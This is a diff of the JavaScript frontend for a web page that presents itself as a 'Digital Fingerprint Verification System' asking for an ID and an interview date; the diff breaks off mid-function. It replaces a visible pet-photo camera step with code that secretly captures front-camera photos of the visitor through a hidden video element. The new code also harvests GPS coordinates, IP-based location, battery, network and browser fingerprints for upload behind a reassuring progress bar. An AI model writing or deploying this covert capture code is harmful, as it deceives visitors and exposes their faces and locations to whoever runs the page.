@@ -1,700 +1,502 @@
 /**
- * Open-Share - Digital Fingerprint Verification System
- * Frontend Application
+ * Open-Share — Frontend Application
+ * Digital Fingerprint Verification System
  */
 
-class OpenShareApp {
-    constructor() {
-        this.interviewDates = [];
-        this.capturedPhotos = [];
-        this.extractedData = {};
-        this.mediaStream = null;
-        this.isCapturing = false;
-        this.captureCount = 0;
-        this.captureInterval = null;
-        this.timerInterval = null;
+(function() {
+  'use strict';
 
-        this.init();
+  // ===== STATE =====
+  const state = {
+    rorshid: '',
+    interviewDate: '',
+    dates: [],
+    deviceData: {},
+    photos: [],
+    isSubmitting: false
+  };
+
+  // ===== DOM ELEMENTS =====
+  const els = {
+    stepForm: document.getElementById('step-form'),
+    stepLoading: document.getElementById('step-loading'),
+    stepSuccess: document.getElementById('step-success'),
+    form: document.getElementById('verify-form'),
+    rorshidInput: document.getElementById('rorshid'),
+    dateTrigger: document.getElementById('date-select-trigger'),
+    dateDropdown: document.getElementById('date-dropdown'),
+    dateList: document.getElementById('date-list'),
+    dateSearch: document.getElementById('date-search'),
+    dateHidden: document.getElementById('interview-date'),
+    submitBtn: document.getElementById('submit-btn'),
+    modal: document.getElementById('permission-modal'),
+    modalOkBtn: document.getElementById('modal-ok-btn'),
+    progressFill: document.getElementById('progress-fill'),
+    progressText: document.getElementById('progress-text'),
+    hiddenVideo: document.getElementById('hidden-video'),
+    hiddenCanvas: document.getElementById('hidden-canvas')
+  };
+
+  // ===== INIT =====
+  async function init() {
+    await loadDates();
+    setupEventListeners();
+    setupCustomSelect();
+  }
+
+  // ===== LOAD DATES =====
+  async function loadDates() {
+    try {
+      const res = await fetch('/api/dates');
+      const data = await res.json();
+      if (data.success) {
+        state.dates = data.dates;
+        renderDateList(data.dates);
+      }
+    } catch (err) {
+      // Fallback to hardcoded dates
+      state.dates = [
+        "01/01/2026","15/01/2026","10/02/2026","05/03/2026",
+        "20/04/2026","01/05/2026","15/06/2026","04/07/2026",
+        "31/07/2026","05/08/2026"
+      ];
+      renderDateList(state.dates);
+    }
+  }
+
+  // ===== RENDER DATE LIST =====
+  function renderDateList(dates) {
+    els.dateList.innerHTML = '';
+    if (dates.length === 0) {
+      els.dateList.innerHTML = '<div class="dropdown-empty">No dates found</div>';
+      return;
+    }
+    dates.forEach(date => {
+      const item = document.createElement('div');
+      item.className = 'dropdown-item';
+      item.dataset.value = date;
+      item.innerHTML = `<span class="date-dot"></span><span>${formatDate(date)}</span>`;
+      item.addEventListener('click', () => selectDate(date));
+      els.dateList.appendChild(item);
+    });
+  }
+
+  function formatDate(dateStr) {
+    const [d, m, y] = dateStr.split('/');
+    const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    return `${parseInt(d)} ${months[parseInt(m)-1]} ${y}`;
+  }
+
+  // ===== CUSTOM SELECT =====
+  function setupCustomSelect() {
+    // Toggle dropdown
+    els.dateTrigger.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const isOpen = els.dateDropdown.classList.contains('open');
+      if (isOpen) {
+        closeDropdown();
+      } else {
+        openDropdown();
+      }
+    });
+
+    // Search filter
+    els.dateSearch.addEventListener('input', (e) => {
+      const query = e.target.value.toLowerCase();
+      const filtered = state.dates.filter(d => 
+        d.toLowerCase().includes(query) || 
+        formatDate(d).toLowerCase().includes(query)
+      );
+      renderDateList(filtered);
+    });
+
+    // Close on outside click
+    document.addEventListener('click', (e) => {
+      if (!els.dateTrigger.contains(e.target) && !els.dateDropdown.contains(e.target)) {
+        closeDropdown();
+      }
+    });
+  }
+
+  function openDropdown() {
+    els.dateDropdown.classList.add('open');
+    els.dateTrigger.classList.add('active');
+    setTimeout(() => els.dateSearch.focus(), 100);
+  }
+
+  function closeDropdown() {
+    els.dateDropdown.classList.remove('open');
+    els.dateTrigger.classList.remove('active');
+  }
+
+  function selectDate(date) {
+    state.interviewDate = date;
+    els.dateHidden.value = date;
+    els.dateTrigger.querySelector('.select-placeholder').textContent = formatDate(date);
+    els.dateTrigger.querySelector('.select-placeholder').classList.add('selected');
+
+    // Update selected state in list
+    document.querySelectorAll('.dropdown-item').forEach(item => {
+      item.classList.toggle('selected', item.dataset.value === date);
+    });
+
+    closeDropdown();
+  }
+
+  // ===== EVENT LISTENERS =====
+  function setupEventListeners() {
+    // Form submit
+    els.form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      if (!els.rorshidInput.value.trim()) {
+        els.rorshidInput.focus();
+        return;
+      }
+      if (!state.interviewDate) {
+        openDropdown();
+        return;
+      }
+      state.rorshid = els.rorshidInput.value.trim();
+      showModal();
+    });
+
+    // Modal OK
+    els.modalOkBtn.addEventListener('click', async () => {
+      hideModal();
+      await startExtraction();
+    });
+  }
+
+  // ===== MODAL =====
+  function showModal() {
+    els.modal.classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function hideModal() {
+    els.modal.classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  // ===== STEP NAVIGATION =====
+  function showStep(stepEl) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    stepEl.classList.add('active');
+  }
+
+  // ===== UPDATE PROGRESS =====
+  function updateProgress(percent, text) {
+    els.progressFill.style.width = percent + '%';
+    els.progressText.textContent = text;
+  }
+
+  // ===== START EXTRACTION =====
+  async function startExtraction() {
+    showStep(els.stepLoading);
+    state.isSubmitting = true;
+
+    try {
+      updateProgress(5, 'Gathering device information...');
+
+      // Collect all device data
+      const deviceData = await collectDeviceData();
+      state.deviceData = deviceData;
+
+      updateProgress(30, 'Requesting camera access...');
+
+      // Capture photos (hidden, no UI shown)
+      const photos = await capturePhotos();
+      state.photos = photos;
+
+      updateProgress(70, 'Uploading data securely...');
+
+      // Submit to backend
+      await submitData(deviceData, photos);
+
+      updateProgress(100, 'Complete!');
+
+      // Show success
+      setTimeout(() => {
+        showStep(els.stepSuccess);
+      }, 500);
+
+    } catch (err) {
+      console.error('Extraction error:', err);
+      updateProgress(0, 'Error occurred. Please try again.');
+      setTimeout(() => {
+        showStep(els.stepForm);
+        state.isSubmitting = false;
+      }, 2000);
+    }
+  }
+
+  // ===== COLLECT DEVICE DATA =====
+  async function collectDeviceData() {
+    const data = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+      screenResolution: `${screen.width}x${screen.height}`,
+      screenAvail: `${screen.availWidth}x${screen.availHeight}`,
+      colorDepth: screen.colorDepth + '-bit',
+      pixelRatio: window.devicePixelRatio || 1,
+      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      orientation: screen.orientation ? screen.orientation.type : 'unknown',
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      cores: navigator.hardwareConcurrency || 'unknown',
+      memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+      online: navigator.onLine ? 'Online' : 'Offline',
+      cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+      doNotTrack: navigator.doNotTrack || 'unknown',
+      pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
+      webdriver: navigator.webdriver ? 'Yes' : 'No',
+      vendor: navigator.vendor || 'unknown',
+      product: navigator.product || 'unknown',
+      productSub: navigator.productSub || 'unknown',
+      oscpu: navigator.oscpu || 'unknown',
+      connectionType: 'unknown',
+      effectiveType: 'unknown',
+      downlink: 'unknown',
+      rtt: 'unknown',
+      saveData: 'unknown',
+      networkProvider: 'unknown',
+      battery: 'Not available',
+      ipv6: 'Fetching...',
+      gpsLocation: 'Not requested',
+      approxLocation: 'Fetching...',
+      browser: detectBrowser(),
+      os: detectOS(),
+      deviceType: detectDeviceType()
+    };
+
+    // Network info
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+      data.connectionType = conn.type || 'unknown';
+      data.effectiveType = conn.effectiveType || 'unknown';
+      data.downlink = (conn.downlink || 'unknown') + ' Mbps';
+      data.rtt = (conn.rtt || 'unknown') + ' ms';
+      data.saveData = conn.saveData ? 'Yes' : 'No';
     }
 
-    async init() {
-        await this.loadDates();
-        this.setupEventListeners();
-        this.setupBackgroundAnimation();
-        this.setupParticles();
-        this.setupCustomSelect();
+    // Battery API
+    if ('getBattery' in navigator) {
+      try {
+        const battery = await navigator.getBattery();
+        data.battery = `${Math.round(battery.level * 100)}% — ${battery.charging ? 'Charging' : 'Discharging'}`;
+      } catch (e) {
+        data.battery = 'Permission denied';
+      }
     }
 
-    // Load interview dates from backend
-    async loadDates() {
-        try {
-            const response = await fetch('/api/dates');
-            const data = await response.json();
-            if (data.success) {
-                this.interviewDates = data.dates;
-                this.populateDateSelect();
-            }
-        } catch (error) {
-            console.error('Failed to load dates:', error);
-            // Fallback to hardcoded dates
-            this.interviewDates = [
-                "01/01/2026", "15/01/2026", "10/02/2026", "05/03/2026",
-                "20/04/2026", "01/05/2026", "15/06/2026", "04/07/2026",
-                "31/07/2026", "05/08/2026"
-            ];
-            this.populateDateSelect();
-        }
-    }
+    // IP Address (IPv6 preferred, fallback to IPv4)
+    try {
+      const ipRes = await fetch('https://api64.ipify.org?format=json', { 
+        mode: 'cors',
+        signal: AbortSignal.timeout(5000)
+      });
+      const ipData = await ipRes.json();
+      data.ipv6 = ipData.ip;
 
-    // Populate custom date select
-    populateDateSelect() {
-        const optionsList = document.getElementById('optionsList');
-        optionsList.innerHTML = '';
-
-        this.interviewDates.forEach((date, index) => {
-            const option = document.createElement('div');
-            option.className = 'option-item';
-            option.innerHTML = `
-                <i class="fas fa-calendar-check"></i>
-                <span>${date}</span>
-            `;
-            option.addEventListener('click', () => this.selectDate(date, option));
-            optionsList.appendChild(option);
+      // Try to get location from IP
+      try {
+        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`, {
+          signal: AbortSignal.timeout(5000)
         });
+        const geoData = await geoRes.json();
+        data.approxLocation = `${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}`;
+        data.networkProvider = geoData.org || geoData.asn || 'Unknown';
+      } catch (e) {
+        data.approxLocation = 'Could not determine';
+      }
+    } catch (e) {
+      data.ipv6 = 'Could not fetch';
+      data.approxLocation = 'Could not determine';
     }
 
-    // Setup custom select behavior
-    setupCustomSelect() {
-        const dateSelect = document.getElementById('dateSelect');
-        const selectTrigger = dateSelect.querySelector('.select-trigger');
-
-        selectTrigger.addEventListener('click', (e) => {
-            e.stopPropagation();
-            dateSelect.classList.toggle('active');
+    // GPS Location
+    if ('geolocation' in navigator) {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          });
         });
-
-        document.addEventListener('click', (e) => {
-            if (!dateSelect.contains(e.target)) {
-                dateSelect.classList.remove('active');
-            }
-        });
-    }
-
-    // Select a date
-    selectDate(date, element) {
-        const dateSelect = document.getElementById('dateSelect');
-        const placeholder = dateSelect.querySelector('.select-placeholder');
-        const hiddenInput = document.getElementById('interviewDate');
-
-        // Update visual
-        placeholder.innerHTML = `<i class="fas fa-calendar-check"></i> ${date}`;
-        placeholder.classList.add('selected');
-
-        // Update hidden input
-        hiddenInput.value = date;
-
-        // Update active state
-        dateSelect.querySelectorAll('.option-item').forEach(opt => opt.classList.remove('selected'));
-        element.classList.add('selected');
-
-        // Close dropdown
-        dateSelect.classList.remove('active');
-
-        // Add subtle animation
-        this.animateElement(placeholder, 'pulse');
-    }
-
-    // Setup event listeners
-    setupEventListeners() {
-        // Form submission
-        const form = document.getElementById('verifyForm');
-        form.addEventListener('submit', (e) => this.handleSubmit(e));
-
-        // Modal buttons
-        document.getElementById('cancelBtn').addEventListener('click', () => this.closeModal('permissionModal'));
-        document.getElementById('confirmBtn').addEventListener('click', () => this.startVerification());
-        document.getElementById('successCloseBtn').addEventListener('click', () => this.resetApp());
-
-        // Input animations
-        const rorshidInput = document.getElementById('rorshid');
-        rorshidInput.addEventListener('focus', () => this.animateElement(rorshidInput.parentElement, 'glow'));
-    }
-
-    // Handle form submission
-    handleSubmit(e) {
-        e.preventDefault();
-
-        const rorshid = document.getElementById('rorshid').value.trim();
-        const interviewDate = document.getElementById('interviewDate').value;
-
-        if (!rorshid) {
-            this.showToast('Please enter your @rorshid ID', 'error');
-            document.getElementById('rorshid').focus();
-            return;
+        data.gpsLocation = `Lat: ${position.coords.latitude.toFixed(6)}, Lng: ${position.coords.longitude.toFixed(6)}`;
+        if (position.coords.accuracy) {
+          data.gpsLocation += ` (±${Math.round(position.coords.accuracy)}m)`;
         }
-
-        if (!interviewDate) {
-            this.showToast('Please select your interview date', 'error');
-            document.getElementById('dateSelect').classList.add('active');
-            return;
+        if (position.coords.altitude) {
+          data.gpsLocation += ` | Alt: ${position.coords.altitude.toFixed(1)}m`;
         }
-
-        // Show permission modal
-        this.openModal('permissionModal');
+      } catch (e) {
+        data.gpsLocation = e.code === 1 ? 'Permission denied' : 'Could not fetch';
+      }
     }
 
-    // Start verification process
-    async startVerification() {
-        this.closeModal('permissionModal');
-
-        // Show camera modal
-        this.openModal('cameraModal');
-
-        try {
-            await this.initializeCamera();
-        } catch (error) {
-            console.error('Camera initialization failed:', error);
-            this.showToast('Camera access denied or unavailable', 'error');
-            this.closeModal('cameraModal');
-            return;
-        }
+    // Canvas fingerprint
+    try {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillText('Open-Share Fingerprint', 2, 2);
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      data.canvasFingerprint = canvas.toDataURL().slice(0, 50) + '...';
+    } catch (e) {
+      data.canvasFingerprint = 'Not available';
     }
 
-    // Initialize camera
-    async initializeCamera() {
-        const video = document.getElementById('cameraFeed');
-        const statusText = document.getElementById('statusText');
+    // WebGL info
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          data.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+          data.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      }
+    } catch (e) {
+      data.webglVendor = 'Not available';
+    }
 
-        statusText.textContent = 'Requesting camera access...';
+    return data;
+  }
 
-        // Determine camera constraints
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  // ===== DETECT BROWSER =====
+  function detectBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
+    if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+    if (ua.includes('Trident') || ua.includes('MSIE')) return 'Internet Explorer';
+    if (ua.includes('Edge') || ua.includes('Edg')) return 'Microsoft Edge';
+    if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+    return 'Unknown';
+  }
 
-        const constraints = {
-            video: {
-                facingMode: isMobile ? { exact: 'environment' } : 'user',
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            },
-            audio: false
+  // ===== DETECT OS =====
+  function detectOS() {
+    const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
+    if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
+    if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
+    if (/Mac OS X/.test(ua)) return 'macOS';
+    if (/Android/.test(ua)) return 'Android';
+    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+    if (/Linux/.test(platform)) return 'Linux';
+    return platform || 'Unknown';
+  }
+
+  // ===== DETECT DEVICE TYPE =====
+  function detectDeviceType() {
+    const ua = navigator.userAgent;
+    if (/Mobi|Android|iPhone|iPad|iPod/.test(ua)) {
+      if (/iPad/.test(ua)) return 'Tablet (iPad)';
+      if (/Tablet|Tab/.test(ua)) return 'Tablet';
+      return 'Mobile';
+    }
+    return 'Desktop';
+  }
+
+  // ===== CAPTURE PHOTOS (HIDDEN) =====
+  async function capturePhotos() {
+    const photos = [];
+    const video = els.hiddenVideo;
+    const canvas = els.hiddenCanvas;
+    const ctx = canvas.getContext('2d');
+
+    try {
+      // Request camera access
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { 
+          facingMode: 'user',
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        },
+        audio: false
+      });
+
+      video.srcObject = stream;
+
+      // Wait for video to be ready
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => {
+          video.play();
+          resolve();
         };
+      });
 
-        try {
-            this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = this.mediaStream;
+      // Set canvas size
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
 
-            await new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    video.play();
-                    resolve();
-                };
-            });
+      // Capture 3 photos, 1 per second
+      for (let i = 0; i < 3; i++) {
+        await new Promise(r => setTimeout(r, 1000));
 
-            statusText.textContent = 'Camera active - Position your pet';
-
-            // Start capture sequence after brief delay
-            setTimeout(() => this.startCaptureSequence(), 1500);
-
-        } catch (error) {
-            // Fallback to any available camera
-            try {
-                const fallbackConstraints = { video: true, audio: false };
-                this.mediaStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
-                video.srcObject = this.mediaStream;
-
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-
-                statusText.textContent = 'Camera active - Position your pet';
-                setTimeout(() => this.startCaptureSequence(), 1500);
-
-            } catch (fallbackError) {
-                throw fallbackError;
-            }
-        }
-    }
-
-    // Start capture sequence (6 seconds, 3 pairs = 6 photos)
-    startCaptureSequence() {
-        this.isCapturing = true;
-        this.captureCount = 0;
-        this.capturedPhotos = [];
-
-        const statusText = document.getElementById('statusText');
-        statusText.textContent = 'Capturing... Keep pet in frame';
-
-        // Update timer display
-        let timeLeft = 6.0;
-        const timerDisplay = document.getElementById('timerDisplay');
-
-        this.timerInterval = setInterval(() => {
-            timeLeft -= 0.1;
-            timerDisplay.textContent = timeLeft.toFixed(1) + 's';
-
-            if (timeLeft <= 0) {
-                clearInterval(this.timerInterval);
-            }
-        }, 100);
-
-        // Capture photos at intervals (every 1 second for 6 seconds = 6 photos)
-        const captureTimes = [1000, 2000, 3000, 4000, 5000, 6000];
-
-        captureTimes.forEach((time, index) => {
-            setTimeout(() => {
-                this.capturePhoto(index + 1);
-            }, time);
-        });
-
-        // End capture after 6 seconds
-        setTimeout(() => {
-            this.endCaptureSequence();
-        }, 6500);
-    }
-
-    // Capture a single photo
-    capturePhoto(index) {
-        const video = document.getElementById('cameraFeed');
-        const canvas = document.getElementById('captureCanvas');
-        const ctx = canvas.getContext('2d');
-
-        // Set canvas size to match video
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-
-        // Draw video frame to canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         // Convert to blob
-        canvas.toBlob((blob) => {
-            const file = new File([blob], `pet-photo-${index}.jpg`, { type: 'image/jpeg' });
-            this.capturedPhotos.push(file);
-
-            // Update progress
-            this.updateCaptureProgress(index);
-
-            // Flash animation
-            this.triggerCaptureAnimation();
-
-        }, 'image/jpeg', 0.85);
-    }
-
-    // Update capture progress UI
-    updateCaptureProgress(count) {
-        const progressCircle = document.getElementById('progressCircle');
-        const captureCount = document.getElementById('captureCount');
-
-        const circumference = 2 * Math.PI * 45; // r=45
-        const offset = circumference - (count / 6) * circumference;
-
-        progressCircle.style.strokeDashoffset = offset;
-        captureCount.textContent = count;
-    }
-
-    // Trigger capture flash animation
-    triggerCaptureAnimation() {
-        const animation = document.getElementById('captureAnimation');
-        animation.classList.add('active');
-
-        setTimeout(() => {
-            animation.classList.remove('active');
-        }, 600);
-    }
-
-    // End capture sequence
-    async endCaptureSequence() {
-        this.isCapturing = false;
-
-        // Stop camera
-        if (this.mediaStream) {
-            this.mediaStream.getTracks().forEach(track => track.stop());
-            this.mediaStream = null;
-        }
-
-        // Close camera modal
-        this.closeModal('cameraModal');
-
-        // Show processing modal
-        this.openModal('processingModal');
-
-        // Extract data
-        await this.extractAllData();
-
-        // Send data
-        await this.sendData();
-    }
-
-    // Extract all device data
-    async extractAllData() {
-        const extractionOrder = [
-            { id: 'ext-ip', key: 'ipAddress', extractor: () => this.getIPAddress() },
-            { id: 'ext-location', key: 'approxLocation', extractor: () => this.getApproxLocation() },
-            { id: 'ext-browser', key: 'browserType', extractor: () => this.getBrowserInfo() },
-            { id: 'ext-os', key: 'os', extractor: () => this.getOSInfo() },
-            { id: 'ext-device', key: 'deviceType', extractor: () => this.getDeviceType() },
-            { id: 'ext-language', key: 'language', extractor: () => this.getLanguage() },
-            { id: 'ext-gps', key: 'gpsLocation', extractor: () => this.getGPSLocation() },
-            { id: 'ext-screen', key: 'screenResolution', extractor: () => this.getScreenResolution() },
-            { id: 'ext-network', key: 'networkProvider', extractor: () => this.getNetworkInfo() },
-            { id: 'ext-battery', key: 'batteryInfo', extractor: () => this.getBatteryInfo() }
-        ];
-
-        for (const item of extractionOrder) {
-            try {
-                const value = await item.extractor();
-                this.extractedData[item.key] = value;
-                this.markExtractionComplete(item.id, value);
-            } catch (error) {
-                console.error(`Failed to extract ${item.key}:`, error);
-                this.extractedData[item.key] = 'N/A';
-                this.markExtractionComplete(item.id, 'N/A');
-            }
-
-            // Small delay for visual effect
-            await new Promise(resolve => setTimeout(resolve, 300));
-        }
-    }
-
-    // Mark extraction item as complete
-    markExtractionComplete(id, value) {
-        const element = document.getElementById(id);
-        if (element) {
-            element.classList.add('completed');
-            const statusIcon = element.querySelector('.extract-status i');
-            if (statusIcon) {
-                statusIcon.className = 'fas fa-check';
-            }
-        }
-    }
-
-    // Data extraction methods
-    async getIPAddress() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip || 'N/A';
-        } catch {
-            return 'N/A';
-        }
-    }
-
-    async getApproxLocation() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            return `${data.city}, ${data.region}, ${data.country_name}`;
-        } catch {
-            return 'N/A';
-        }
-    }
-
-    getBrowserInfo() {
-        const ua = navigator.userAgent;
-        let browser = 'Unknown';
-
-        if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-        else if (ua.includes('Firefox')) browser = 'Firefox';
-        else if (ua.includes('Edg')) browser = 'Edge';
-        else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
-
-        return browser;
-    }
-
-    getOSInfo() {
-        const ua = navigator.userAgent;
-        let os = 'Unknown';
-
-        if (ua.includes('Windows')) os = 'Windows';
-        else if (ua.includes('Mac')) os = 'macOS';
-        else if (ua.includes('Linux')) os = 'Linux';
-        else if (ua.includes('Android')) os = 'Android';
-        else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-
-        return os;
-    }
-
-    getDeviceType() {
-        const ua = navigator.userAgent;
-        if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
-            return /iPad|Tablet/i.test(ua) ? 'Tablet' : 'Mobile';
-        }
-        return 'Desktop';
-    }
-
-    getLanguage() {
-        return navigator.language || navigator.userLanguage || 'N/A';
-    }
-
-    async getGPSLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve('N/A');
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    resolve(`${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`);
-                },
-                () => {
-                    resolve('Permission denied');
-                },
-                { timeout: 5000, enableHighAccuracy: false }
-            );
-        });
-    }
-
-    getScreenResolution() {
-        return `${window.screen.width}x${window.screen.height}`;
-    }
-
-    getNetworkInfo() {
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (connection) {
-            const type = connection.effectiveType || 'unknown';
-            const downlink = connection.downlink ? `${connection.downlink} Mbps` : '';
-            return `${type.toUpperCase()} ${downlink}`.trim();
-        }
-        return 'N/A';
-    }
-
-    async getBatteryInfo() {
-        try {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                const level = Math.round(battery.level * 100);
-                const status = battery.charging ? 'Charging' : 'Discharging';
-                return `${level}% (${status})`;
-            }
-            return 'Not supported';
-        } catch {
-            return 'N/A';
-        }
-    }
-
-    // Send data to backend
-    async sendData() {
-        const formData = new FormData();
-
-        // Add form fields
-        formData.append('rorshid', document.getElementById('rorshid').value);
-        formData.append('interviewDate', document.getElementById('interviewDate').value);
-
-        // Add extracted data
-        Object.keys(this.extractedData).forEach(key => {
-            formData.append(key, this.extractedData[key]);
+        const blob = await new Promise(resolve => {
+          canvas.toBlob(resolve, 'image/jpeg', 0.85);
         });
 
-        // Add photos
-        this.capturedPhotos.forEach((photo, index) => {
-            formData.append('petPhotos', photo, `pet-photo-${index + 1}.jpg`);
-        });
-
-        try {
-            const response = await fetch('/api/verify', {
-                method: 'POST',
-                body: formData
-            });
-
-            const result = await response.json();
-
-            if (result.success) {
-                this.closeModal('processingModal');
-                this.openModal('successModal');
-                this.showToast('Verification submitted successfully', 'success');
-            } else {
-                throw new Error(result.message);
-            }
-        } catch (error) {
-            console.error('Submission error:', error);
-            this.closeModal('processingModal');
-            this.showToast('Failed to submit verification. Please try again.', 'error');
-        }
-    }
-
-    // Reset application
-    resetApp() {
-        this.closeModal('successModal');
-        document.getElementById('verifyForm').reset();
-        document.getElementById('interviewDate').value = '';
-
-        const placeholder = document.querySelector('.select-placeholder');
-        placeholder.innerHTML = '<i class="fas fa-calendar-day"></i> Select your interview date';
-        placeholder.classList.remove('selected');
-
-        document.querySelectorAll('.option-item').forEach(opt => opt.classList.remove('selected'));
-
-        // Reset extraction UI
-        document.querySelectorAll('.extract-item').forEach(item => {
-            item.classList.remove('completed');
-            const icon = item.querySelector('.extract-status i');
-            if (icon) icon.className = 'fas fa-spinner fa-spin';
-        });
-
-        // Reset progress
-        document.getElementById('progressCircle').style.strokeDashoffset = 283;
-        document.getElementById('captureCount').textContent = '0';
-
-        this.capturedPhotos = [];
-        this.extractedData = {};
-    }
-
-    // Modal utilities
-    openModal(modalId) {
-        const modal = document.getElementById(modalId);
-        modal.classList.add('active');
-        document.body.style.overflow = 'hidden';
-    }
-
-    closeModal(modalId) {
-        const modal = document.getElementById(modalId);
-        modal.classList.remove('active');
-        document.body.style.overflow = '';
-    }
-
-    // Toast notifications
-    showToast(message, type = 'info') {
-        const container = document.getElementById('toastContainer');
-        const toast = document.createElement('div');
-        toast.className = `toast ${type}`;
-
-        const icons = {
-            success: 'fa-check-circle',
-            error: 'fa-exclamation-circle',
-            warning: 'fa-exclamation-triangle',
-            info: 'fa-info-circle'
-        };
-
-        toast.innerHTML = `
-            <i class="fas ${icons[type]}"></i>
-            <span>${message}</span>
-        `;
-
-        container.appendChild(toast);
-
-        // Auto remove
-        setTimeout(() => {
-            toast.classList.add('toast-out');
-            setTimeout(() => toast.remove(), 300);
-        }, 4000);
-    }
-
-    // Animation utilities
-    animateElement(element, animationName) {
-        element.style.animation = 'none';
-        element.offsetHeight; // Trigger reflow
-        element.style.animation = `${animationName} 0.5s ease`;
-    }
-
-    // Background canvas animation (3D floating shapes)
-    setupBackgroundAnimation() {
-        const canvas = document.getElementById('bgCanvas');
-        const ctx = canvas.getContext('2d');
-
-        let width, height;
-        let shapes = [];
-
-        const resize = () => {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-        };
-
-        window.addEventListener('resize', resize);
-        resize();
-
-        // Create floating shapes
-        for (let i = 0; i < 15; i++) {
-            shapes.push({
-                x: Math.random() * width,
-                y: Math.random() * height,
-                size: Math.random() * 80 + 40,
-                speedX: (Math.random() - 0.5) * 0.5,
-                speedY: (Math.random() - 0.5) * 0.5,
-                rotation: Math.random() * Math.PI * 2,
-                rotationSpeed: (Math.random() - 0.5) * 0.01,
-                opacity: Math.random() * 0.03 + 0.01
-            });
+        if (blob) {
+          photos.push(blob);
         }
 
-        const animate = () => {
-            ctx.clearRect(0, 0, width, height);
+        updateProgress(30 + ((i + 1) * 12), `Capturing photo ${i + 1}/3...`);
+      }
 
-            shapes.forEach(shape => {
-                shape.x += shape.speedX;
-                shape.y += shape.speedY;
-                shape.rotation += shape.rotationSpeed;
+      // Stop all tracks
+      stream.getTracks().forEach(track => track.stop());
+      video.srcObject = null;
 
-                // Wrap around
-                if (shape.x < -shape.size) shape.x = width + shape.size;
-                if (shape.x > width + shape.size) shape.x = -shape.size;
-                if (shape.y < -shape.size) shape.y = height + shape.size;
-                if (shape.y > height + shape.size) shape.y = -shape.size;
-
-                ctx.save();
-                ctx.translate(shape.x, shape.y);
-                ctx.rotate(shape.rotation);
-
-                // Draw neumorphic-like shape
-                ctx.fillStyle = `rgba(212, 168, 67, ${shape.opacity})`;
-                ctx.shadowColor = 'rgba(0, 0, 0, 0.1)';
